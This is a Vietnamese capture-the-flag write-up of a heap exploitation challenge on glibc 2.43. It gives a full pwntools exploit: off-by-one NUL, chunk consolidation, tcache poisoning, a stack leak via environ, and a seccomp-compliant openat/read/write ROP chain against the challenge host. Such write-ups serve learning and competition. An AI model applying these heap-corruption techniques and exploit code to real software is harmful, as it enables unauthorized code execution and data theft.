---
title: "Original Unlimited Codex 100% Free"
category: "Pwn"
tags: ["off-by-one", "heap-consolidation", "tcache-poisoning", "seccomp", "orw-rop", "glibc-2.43"]
solve_date: "2026-10-10T17:03:00+07:00"
language: "vi"
points: 908
---

# Original Unlimited Codex 100% Free

**Flag:** `kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}`  
**Service:** `nc 34.82.235.213 1337` (socat forking, chạy binary với `ld-2.43.so`/`libc.so.6` đi kèm)  
**Định dạng flag:** `kBxAc{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `handout.7z` | 757,389 | `c14c6fecb0fbcd526fb1936d32c600f0438081f7d8b5bdd12cc789a1f1449796` |
| `unlimited_codex_for_free` | 14,464 | `0807462400d708343852e25efb939cf5e4f6dd146bedd3c54214539d14c6b346` |
| `libc.so.6` (Debian glibc 2.43-4) | 2,014,248 | `38d7683f427c9ff265656bd35130d070afac1a58738607eacd70a268f7792063` |
| `ld-2.43.so` | 230,200 | `fc181016dc31c41f03ecb9014788006e0282616105740a58135641a0d9b7210e` |
| `flag.txt` (bản test, `kBxAc{TEST_FLAG}`) | 17 | `2cb571008c565006bb09836623f82c1cda5b2a51052830b2b210d837ee4d4f2c` |
| `Dockerfile` | 459 | `ca8abfda8493f511cd71e5b514ee1a3483dcf485b0a875e5f8be4909b66efcae` |

## Đề bài

> Pwn — Original Unlimited Codex 100% Free — 993 points. Claim your Free Unlimited Codex Here 💑

Artifact là một binary menu chạy trong container `ubuntu:24.04` kèm `ld-2.43.so` và `libc.so.6`; `flag.txt` đặt cạnh binary, chạy dưới user `player`. Đọc flag từ remote.

## Phân tích

**Protections và bề mặt chương trình.** `readelf -h` cho `DYN` (PIE), `GNU_STACK` chỉ `RW` (NX bật), `GNU_RELRO` phủ hết `.got`/`.got.plt` (Full RELRO), có `__stack_chk_fail` (canary), binary stripped. PLT chỉ có 12 hàm, không có `system`/`execve`; có `prctl`. Tại `0x14f0` chương trình gọi `prctl(0x26, 1)` (`PR_SET_NO_NEW_PRIVS`) rồi `prctl(0x16, 2, filter)` (`PR_SET_SECCOMP`); `sock_fprog` ở `0x3d50` (file offset `0x2d50`) chứa `len = 53` và con trỏ tới 53 câu lệnh `sock_filter` tại `0x2400`. Decode filter:

```text
ld [arch] ; jeq 0xc000003e ? next : RET KILL_PROCESS     # x86-64 only
ld [nr]
jeq 0(read) 1(write) 3(close) 8(lseek) 9(mmap) 10(mprotect) 11(munmap)
    12(rt_sigaction) 13(brk) 14(rt_sigreturn) 20(getpid) 25(mremap) 28(madvise)
    60(exit) 158 202(futex) 218 231(exit_group) 257(openat) 262(newfstatat)
    273 302(prctl) 318 334(rseq) -> RET ALLOW
default -> RET KILL_PROCESS
```

`execve`(59), `fork`(57), `clone`(56) và `dup2`(34) không nằm trong danh sách → không dùng `execve` để mở shell; lời giải chọn ROP gọi `openat`/`read`/`write`.

**Menu và cơ chế "shelf".** `0x1556` đọc một dòng vào `char buf[0x60]` ở `[rbp-0x70]` (đọc từng byte, dừng ở `\n`, vượt 0x60 thì `_exit`) rồi phân nhánh:

| Lệnh | Hàm | Hành vi |
|---|---|---|
| `scribe i n` + dữ liệu | `0x1992` | `24 ≤ n ≤ 0x1000`, `shelves[i].ptr` phải rỗng; `malloc(n)`, `read` đúng `n` byte; `size=n`, `flag=1` |
| `amend i n` + dữ liệu | `0x1a86` | `n ≥ 0x18`, `n ≤ shelves[i].size`; `read` `n` byte vào `ptr`; **nếu `n == size` thì `ptr[n] = 0`** |
| `read i n` | `0x1b2e` | `write(1, ptr, n)` với `n ≤ size + 0x20` → đọc tràn tối đa 32 byte sang chunk kế tiếp |
| `bind a b` | `0x1bcc` | `shelves[a].ptr/size = shelves[b]`, đặt `flag=2`; **không xóa `b`** → hai shelf cùng trỏ một chunk |
| `burn i` | `0x1ce6` | chỉ khi `flag == 1`: `free(ptr)`, gán `ptr=0`, `size=0`, `flag=0` |
| `index` | `0x1d7a` | in `i:@` cho `flag=2`, `i:#` cho `flag=1` |
| `quit` | — | trả về từ `main` (đã kiểm canary) |

`0x1e77` chặn `i > 0x1f` (32 shelf), các lệnh số học chỉ nhận chữ số ở ký tự đầu nên `strtoul` base 0 vẫn chấp nhận `0x…`.

Vì `burn` là chỗ duy nhất gọi `free` và nó xóa chính shelf đó, còn alias do `bind` tạo ra mang `flag=2` (không được `amend`/`burn`), **alias không cho phép ghi hoặc free trực tiếp qua các lệnh này**. Primitive duy nhất ngoài over-read là byte `0x00` của `amend`.

**Vị trí byte NUL.** Với request `s`, chunk là `align16(s+8)` và `ptr[s] = chunk_next + (s + 8 - align16(s+8)) + 8`. Nếu `s ≡ 8 (mod 16)` thì `align16(s+8) = s+8`, khi đó `ptr[s]` rơi đúng vào **byte thấp của trường `size` của chunk kế tiếp** (không phải `prev_size`). Kiểm chứng trên service: `scribe 4 0xf8` (chunk `0x100`) đứng ngay trước `scribe 5 0x4f8` (chunk `0x500`) cho giá trị `0x501` tại `ptr_C[0xf8]`; sau `amend 4 248` thì `ptr_C[0xf8] = 0x500` — size giữ nguyên, `PREV_INUSE` bị xóa. Điều kiện để chỉ mất bit `PREV_INUSE` mà không đổi size: chunk kề sau phải có `size % 0x100 == 0`.

Thử nghiệm thất bại đầu tiên dùng `s = 0x28` (chunk `0x30`, size `0x31`): NUL biến size thành `0` và free in `free(): invalid size` — đúng như công thức trên, vì `0x31 & ~0xff = 0`.

**Hành vi allocator của glibc 2.43 (đo trực tiếp trên service, đối chiếu với libc đi kèm).**

* `__libc_free` tại `libc+0xa54a0`: đường xử lý nhanh dùng "bundle" per-size-class; ghi `mem[0] = (mem >> 12) ^ head` và `mem[8] = tcache_key`, head lưu plaintext tại `[tls_tcache + 0xa0 + idx*8]`, `idx = (chunksize - 0x20) >> 4` (size lớn dùng `bsr`). `__libc_malloc` tại `libc+0xa4f70` pop: `head = slot`, `slot = (head >> 12) ^ *head`, kiểm tra `head & 0xf == 0`, **không** đối chiếu `chunksize`, và **không** đặt lại `PREV_INUSE` của chunk kề sau.
* Ngưỡng: chunk `≤ 0x300` đi vào bundle, chunk `≥ 0x430` đi vào bins. Free vào bins để `fd = bk = main_arena + 8 = libc + 0x1e7ac8` → base libc suy ra bằng phép trừ này; các lần chạy đều cho kết quả thẳng hàng trang (`0x7f...000`) nên hằng số được chấp nhận.
* Free **đầu tiên** của một class cấp thêm một chunk bundle cỡ `0x300` từ top, nên heap layout là `x(0x300) → y(0x300) → bundle(0x300) → C(0x100) → Q(0x500) → R → S`; biết `mem_x` tuyệt đối thì `mem_C = mem_x + 0x900`.
* `unlink_chunk` (`libc+0xa1450`) kiểm tra `chunksize(p) == *(p + chunksize(p))` rồi `fd->bk == p`, `bk->fd == p` với con trỏ plaintext (không safe-linking cho bins).
* Leak heap tuyệt đối: hai chunk cùng class free liên tiếp cho `mem_x[0] = page` (bin đang rỗng) và `mem_y[0] = page ^ mem_x` → `mem_x = mem_y[0] ^ page` chính xác tới từng byte.

## Lời giải

1. **Leak heap.** `scribe 0/1` cỡ `0x2f8`, `bind 2 0`, `bind 3 1`, `burn 0`, `burn 1`. Đọc alias 2 và 3 bằng `read` (over-read `+0x20` vẫn nằm trong vùng an toàn) → `page = mem_x >> 12`, `mem_x = (page ^ mem_y[0])`.
2. **Bố trí chunk.** `scribe 4 = C (0xf8)`, `scribe 5 = Q (0x4f8)`, `scribe 6/7 = R, S (0x4f8)` (guard, vừa giữ Q không sát top vừa làm `inuse_bit_at_offset(R, 0x100)` hợp lệ). Xác nhận `ptr_C[0xf8] == 0x501` để chắc Q nằm ngay sau C.
3. **NUL có chủ đích.** `amend 4 248` với dữ liệu: `ptr_C[0x18] = 0xe0` (kích thước chunk giả), `ptr_C[0x20] = ptr_C[0x28] = mem_C + 0x10` (fake chunk tự liên kết để qua `unlink_chunk`), `ptr_C[0xf0] = 0xe0` (`Q->prev_size`); lệnh kết thúc `len == size` nên ghi nốt `0x00` vào `ptr_C[0xf8]` → `Q->size = 0x500`.
4. **Consolidation đè lên C.** `burn 5` → `PREV_INUSE(Q) == 0`, `prev = Q - 0xe0 = mem_C + 0x10`, `chunksize(prev) == prev_size`, fd/bk tự tham chiếu nên `unlink_chunk` đồng ý. Chunk gộp `[mem_C+0x10, mem_C+0x5f0)` cỡ `0x5e0` vào unsorted bin, và `fd/bk` ghi tại `ptr_C[0x20]/0x28` chính là `main_arena + 8` → **libc_base**.
5. **Chunk chồng lấn.** `scribe 9 0x5d8` (chunk `0x5e0`, exact fit) nhận chunk gộp: `X_mem = mem_C + 0x20`, tức header của X (`ptr_C[0x10]`, `ptr_C[0x18]`) nằm trong vùng C vẫn ghi được. `amend 4` đặt `X->size = 0x41` (hoặc `0x1f1`) để đổi class lúc free, rồi `burn 9` đẩy `X_mem` vào bundle class đó — chunk này vẫn đang bị C "soi".
6. **Poison con trỏ next.** `amend 4` ghi `X_mem[0] = (X_mem >> 12) ^ target` (đúng công thức un-mangle của pop). `scribe A` pop `X_mem` và đặt head = `target`; `scribe B` pop `target` → shelf B có `ptr` tùy ý. `read B` cho đọc tối đa `size+0x20`, `amend B` cho ghi `size` byte. Request `0x30` (chunk `0x40`) dùng cho việc đọc vì mỗi lần scribe chỉ phá đúng 0x30 byte; request `0x1e0` (chunk `0x1f0`) dùng cho lần ghi cuối.
7. **Định vị return address.** Đọc `environ` tại `libc + 0x1eede8` (chọn `target = env - 0x30` để 8 byte cần đọc nằm ở phần không bị ghi đè) → con trỏ stack. Quét ngược 0x160 byte, mỗi lần 0x20 byte, lấy các slot chứa giá trị trong `[libc+0x28000, libc+0x190000)`. `__libc_start_main = libc+0x2a050 (size 0x14b)`; slot mang `libc+0x29fba` thuộc hàm đứng ngay trước (`__libc_start_call_main`, nơi `call main` returns) và có `rbp-8` cạnh nó là canary với byte thấp bằng 0, `rbp` trỏ vào stack → đó là return address của `main`. `quit` sẽ `ret` vào chuỗi ROP.
8. **ROP.** Ghi tại `R-0x10` khối: canary cũ + saved rbp + chuỗi gadget (giữ nguyên `fs:0x28` check), với chuỗi `"/app/flag.txt"` đặt tại `R+0x120` và buffer đọc tại `R+0x160`:

```text
pop_rdi=-100, pop_rsi=path, pop_rdx=0, pop_rax=257, syscall        # openat
pop_rdi=3,    pop_rsi=buf,  pop_rdx=0x100, pop_rax=0, syscall       # read
pop_rdi=1,    pop_rsi=buf,  pop_rdx=0x100, pop_rax=1, syscall       # write(1, buf)
pop_rax=231, pop_rdi=0, syscall                                     # exit_group
```

Chuỗi ROP dùng `fd = 3` và đã đọc được flag trong các run được ghi nhận; stdin/stdout/stderr được nối qua socat.

## Code giải

Ba file dưới đây chạy trong cùng một thư mục. `codex_io.py` + `codex_util.py` là client menu và hàm parse; `codex.py` là toàn bộ chuỗi khai thác (bản đã chạy lấy flag).

```python
# codex_io.py
import re
from pwn import remote

HOST, PORT = '34.82.235.213', 1337
ANSI = re.compile(rb'\x1b\[[0-9;]*[A-Za-z]')

def clean(b):
    return ANSI.sub(b'', b)

def boot(timeout=6):
    r = remote(HOST, PORT, timeout=timeout)
    r.recvrepeat(1.0)
    return r

def raw(r, data, wait=0.35, timeout=4):
    r.send(data)
    try:
        out = r.recvrepeat(wait)
    except Exception as e:
        out = b'<recv-err:%s>' % str(e).encode()
    return out

def cmd(r, s, wait=0.3, timeout=4):
    if isinstance(s, str):
        s = s.encode()
    return raw(r, s + b'\n', wait, timeout)
```

```python
# codex_util.py
from codex_io import *
import struct

def q(b, i):
    return struct.unpack('<Q', b[i:i+8])[0]

def pread(r, idx, n):
    out = cmd(r, 'read %d %d' % (idx, n), wait=0.4)
    c = clean(out)
    if b'folio stream' not in c:
        return None, c
    body = c.split(b'\n', 1)[1]
    return body[:n], c

def scribe(r, idx, size, data):
    assert len(data) == size
    return raw(r, b'scribe %d %d\n' % (idx, size) + data, wait=0.35)

def amend(r, idx, size, data):
    assert len(data) == size
    return raw(r, b'amend %d %d\n' % (idx, size) + data, wait=0.35)
```

```python
# codex.py
import sys, struct, re
from codex_util import *
from codex_io import clean

ARENA_UNSORTED = 0x1e7ac8
ENVIRON        = 0x1eede8
POP_RDI        = 0x2aaf7
POP_RSI        = 0x29e69
POP_RDX_POP_RBX= 0x91665
POP_RAX        = 0x43ee6
SYSCALL_RET    = 0x921b2
ZERO = bytes([0])
TEXT_LO, TEXT_HI = 0x28000, 0x190000

sC, sQ, sG = 0xf8, 0x4f8, 0x4f8
FAKE       = 0xe0
sX         = 0x5d8
LW         = 0x2f8
BIG, SMALL = 0x1e0, 0x30          # scribe sizes -> chunk 0x1f0 / 0x40
BIGSZ, SMALLSZ = 0x1f1, 0x41      # claimed chunk-size values

def p64(v): return struct.pack('<Q', v & ((1<<64)-1))
def u64(b, i=0): return struct.unpack('<Q', b[i:i+8])[0]
def L(t, o=''):
    print('  > %-20s %s' % (t, o if isinstance(o, str) else repr(o if not isinstance(o, bytes) else clean(o))[:200]))

class Codex:
    def __init__(self):
        self.r = boot(); self.A = 11; self._nb = 12; self.holder = None
    def scribe(self, idx, size, data):
        assert len(data) == size
        return raw(self.r, b'scribe %d %d\n' % (idx, size) + data, wait=0.5)
    def amend(self, idx, size, data):
        o = cmd(self.r, 'amend %d %d' % (idx, size), wait=0.15)
        return o + raw(self.r, data, wait=0.5)
    def rd(self, idx, n): return pread(self.r, idx, n)[0]
    def burn(self, idx): return cmd(self.r, 'burn %d' % idx, wait=0.6)
    def bind(self, a, b): return cmd(self.r, 'bind %d %d' % (a, b), wait=0.4)
    def quit(self):
        return cmd(self.r, 'quit', wait=3.0) + raw(self.r, b'', wait=2.5)

    def setup(self):
        r = self.r
        scribe(r, 0, LW, b'w'*LW); scribe(r, 1, LW, b'W'*LW)
        cmd(r, 'bind 2 0'); cmd(r, 'bind 3 1')
        cmd(r, 'burn 0', wait=0.5); cmd(r, 'burn 1', wait=0.5)
        d2 = self.rd(2, 0x20); d3 = self.rd(3, 0x20)
        page = u64(d2, 0); mem_x = u64(d3, 0) ^ page
        assert mem_x >> 12 == page
        self.mem_C = mem_x + 0x900
        self.X_mem = self.mem_C + 0x20
        prev = self.mem_C + 0x10
        scribe(r, 4, sC, b'C'*sC); scribe(r, 5, sQ, b'Q'*sQ)
        d = self.rd(4, sC + 0x20); assert u64(d, 0xf8) == 0x501, 'layout model wrong'
        scribe(r, 6, sG, b'R'*sG); scribe(r, 7, sG, b'S'*sG)
        pkt = bytearray(b'C'*sC)
        struct.pack_into('<Q', pkt, 0x18, FAKE)
        struct.pack_into('<Q', pkt, 0x20, prev)
        struct.pack_into('<Q', pkt, 0x28, prev)
        struct.pack_into('<Q', pkt, 0xf0, FAKE)
        self.amend(4, sC, bytes(pkt))
        d = self.rd(4, sC+0x20); assert u64(d, 0xf8) == 0x500
        self.bind(8, 5); self.burn(5)
        d = self.rd(4, sC + 0x20); assert d is not None and u64(d,0x20)==u64(d,0x28)
        self.libc = u64(d, 0x20) - ARENA_UNSORTED
        L('libc', hex(self.libc))
        scribe(r, 9, sX, b'X'*sX)
        self.bind(10, 9)
        self.retag_free(SMALLSZ)
        return True

    def retag_free(self, szval):
        pkt = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', pkt, 0x18, szval)     # X chunk "size" field
        struct.pack_into('<Q', pkt, 0x20, 0)
        struct.pack_into('<Q', pkt, 0x28, 0)
        self.amend(4, 0xf0, bytes(pkt))
        self.burn(9 if self.holder is None else self.A)

    def poison(self, target, size):
        assert target % 16 == 0, hex(target)
        szval = BIGSZ if size == BIG else SMALLSZ
        # 1) retag X chunk so the upcoming free lands in the wanted class
        p = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', p, 0x18, szval)
        self.amend(4, 0xf0, bytes(p))
        if self.holder is not None:
            self.burn(self.A)                 # X_mem -> that class' bundle
        # 2) now poison the bundled next pointer
        key = self.X_mem >> 12
        pkt = bytearray(b'C'*0xf0)
        struct.pack_into('<Q', pkt, 0x18, szval)
        struct.pack_into('<Q', pkt, 0x20, key ^ target)
        struct.pack_into('<Q', pkt, 0x28, 0)
        self.amend(4, 0xf0, bytes(pkt))
        self.scribe(self.A, size, b'A'*size)
        self._nb += 1
        b = self._nb
        if b > 31: raise SystemExit('shelves exhausted')
        self.scribe(b, size, b'B'*size)
        self.holder = self.A
        self.B = b
        return b

    def peek(self, addr, n=0x20):
        """intact read of n<=0x20 bytes at 16-aligned addr (clobbers 0x30 below)"""
        assert addr % 16 == 0 and n <= 0x20
        t = addr - SMALL
        self.poison(t, SMALL)
        d = self.rd(self.B, SMALL + 0x20)
        if d is None: return None
        off = addr - t
        return d[off:off+n]

    def poke(self, addr, data):
        assert len(data) <= BIG
        self.poison(addr, BIG)
        self.amend(self.B, BIG, data + b'\0'*(BIG-len(data)))

def build(libc, R):
    g = lambda o: libc + o
    ch = bytearray()
    def e(*v):
        for x in v: ch.extend(p64(x))
    path, buf = R + 0x120, R + 0x160
    e(g(POP_RDI), (-100) & ((1 << 64) - 1))
    e(g(POP_RSI), path)
    e(g(POP_RDX_POP_RBX), 0, 0)
    e(g(POP_RAX), 257)
    e(g(SYSCALL_RET))
    e(g(POP_RDI), 3)
    e(g(POP_RSI), buf)
    e(g(POP_RDX_POP_RBX), 0x100, 0)
    e(g(POP_RAX), 0)
    e(g(SYSCALL_RET))
    e(g(POP_RDI), 1)
    e(g(POP_RSI), buf)
    e(g(POP_RDX_POP_RBX), 0x100, 0)
    e(g(POP_RAX), 1)
    e(g(SYSCALL_RET))
    e(g(POP_RAX), 231)
    e(g(POP_RDI), 0)
    e(g(SYSCALL_RET))
    assert len(ch) <= 0x120, len(ch)
    return bytes(ch).ljust(0x120, ZERO) + b'/app/flag.txt' + ZERO * 7

def main():
    c = Codex(); c.setup()
    libc = c.libc
    d = c.peek((libc + ENVIRON) & ~0xf, 0x20)
    if d is None: L('environ peek died'); return
    off = (libc + ENVIRON) - ((libc + ENVIRON) & ~0xf)
    stackp = u64(d, off)
    L('environ', hex(libc+ENVIRON)); L('stack top-ish', hex(stackp))
    wins = {}
    W = (stackp - 0x160) & ~0xf
    L('sweep from', hex(W))
    while W < stackp - 0x10:
        blk = c.peek(W, 0x20)
        if blk is None: L('died at', hex(W)); break
        wins[W] = blk
        for i in range(0, 0x20, 8):
            v = u64(blk, i)
            if libc + TEXT_LO <= v < libc + TEXT_HI:
                L('text slot', '%s -> libc+0x%x' % (hex(W+i), v - libc))
        W += 0x20
    def wu(a):
        for base, blk in wins.items():
            if base <= a < base + 0x20 and a - base + 8 <= len(blk):
                return u64(blk, a - base)
        return None
    isstack = lambda a, s: a is not None and 0x7f0000000000 < a < 0x8000000000000 and abs(a - s) < 0x4000
    cands = []
    for W in sorted(wins):
        for i in range(0, 0x20, 8):
            slot = W + i; v = u64(wins[W], i)
            if libc + TEXT_LO <= v < libc + TEXT_HI:
                cands.append((slot, v, wu(slot-0x10), wu(slot-8)))
    for slot, v, can, rbp in cands:
        L('cand', '%s val=libc+0x%x canary=%s rbp=%s' % (hex(slot), v-libc,
            hex(can) if can is not None else None, hex(rbp) if rbp is not None else None))
    best = None
    for slot, v, can, rbp in sorted(cands):
        if can is not None and isstack(rbp, slot) and (can & 0xff) == 0:
            best = (slot, v, can, rbp); break
    if best is None and cands:
        slot, v, can, rbp = min(cands)
        best = (slot, v, can if can is not None else 0, rbp if rbp is not None else 0)
    if best is None:
        L('no main return slot found'); return
    R, retv, CAN, RBP = best
    L('CHOSEN R', '%s canary=%s rbp=%s' % (hex(R), hex(CAN), hex(RBP)))
    payload = build(libc, R)
    W = (R - 0x10) & ~0xf
    pad = (R - 0x10) - W
    c.poke(W, b'\0'*pad + p64(CAN) + p64(RBP) + payload)
    out = c.quit()
    print('=== RESULT ===')
    txt = clean(out)
    print(txt[:600])
    L('FLAG', re.findall(rb'kBxAc\{[^}\n\r\x00]*', out))
    c.r.close()

if __name__ == '__main__':
    main()
```

## Kết quả

`write` trong chuỗi ROP lấy 0x100 byte; flag in ra kèm phần byte sau đó của stack:

```text
b'kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}\x00\x00\x00\x008\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00 \xcbo\xa1\x7f\x00\x00...'
```

```text
kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wnl04d_fr33_unl1m1t3d_v3r510n_fr0m_1nt3rn3t~~}
```

Chuỗi trên là nội dung `flag.txt` đọc từ remote qua `openat`/`read`/`write`, không phải `kBxAc{TEST_FLAG}` trong artifact. Chưa lưu phản hồi submission.

Một lần chạy khác (ASLR khác, `write` chỉ 0x60 byte nên flag bị cắt) ghi lại toàn bộ trung gian, có thể dùng để đối chiếu hình dạng output:

```text
  > libc                 0x7fb30e533000
  > environ              0x7fb30e721de8
  > stack top-ish        0x7ffcc94a4628
  > sweep from           0x7ffcc94a44c0
  > text slot            0x7ffcc94a44f8 -> libc+0x29fba
  > text slot            0x7ffcc94a45a8 -> libc+0x2a0d7
  > cand                 0x7ffcc94a44f8 val=libc+0x29fba canary=0x8ebc22d0a363e900 rbp=0x7ffcc94a4618
  > cand                 0x7ffcc94a45a8 val=libc+0x2a0d7 canary=0x8ebc22d0a363e900 rbp=0x0
  > CHOSEN R             0x7ffcc94a44f8 canary=0x8ebc22d0a363e900 rbp=0x7ffcc94a4618
=== RESULT ===
b'kBxAc{~~p4y1ng_f0r_5ub5cr1pt10n_15_n0t_th3_0nly_w4y_t0_g3t_c0d3x_y0u_c4n_51mply_ju5t_51mply_d0wn'
```

## Tái hiện

Cần Python 3 + `pwntools`, artifact trong cùng thư mục để kiểm tra offset để đối chiếu các offset được dùng. Service fork theo kết nối nên mỗi lần chạy là một tiến trình mới, ASLR khác nhau; script không hard-code địa chỉ runtime nào ngoài các offset của libc.

```bash
pip install pwntools
python codex.py
```

Lưu ba fenced block thành `codex_io.py`, `codex_util.py`, `codex.py` rồi chạy file cuối. Hằng số cần nếu libc đổi bản: `ARENA_UNSORTED` (đầu unsorted bin trong `main_arena`), `ENVIRON`, và các gadget `pop rdi/rsi/rdx+rax/rax/syscall`.

Điểm cần chú ý khi chỉnh chuỗi khai thác:

* Class bundle quyết định cả `size` của `scribe` lúc pop: muốn đổi class phải ghi lại `X->size` **trước** `burn`, vì free đọc header chứ không đọc `shelves[i].size`.
* Địa chỉ đưa vào head phải `& 0xf == 0`; pop không kiểm tra `chunksize` nhưng sẽ `malloc_printerr` nếu lệch.
* Quét stack bằng class nhỏ (`0x30`): mỗi vòng `scribe` ghi `0x30` byte xuống phía dưới vùng đọc, nên chỉ 0x20 byte phía trên là còn nguyên. Dùng class lớn (`0x1e0`) để quét sẽ phá frame đang sống của `main` và làm chết tiến trình ở vòng đọc kế tiếp.
* Cú ghi cuối cùng phải kèm lại canary và saved rbp, nếu không `quit` sẽ rơi vào `__stack_chk_fail` trước khi `ret` vào ROP.
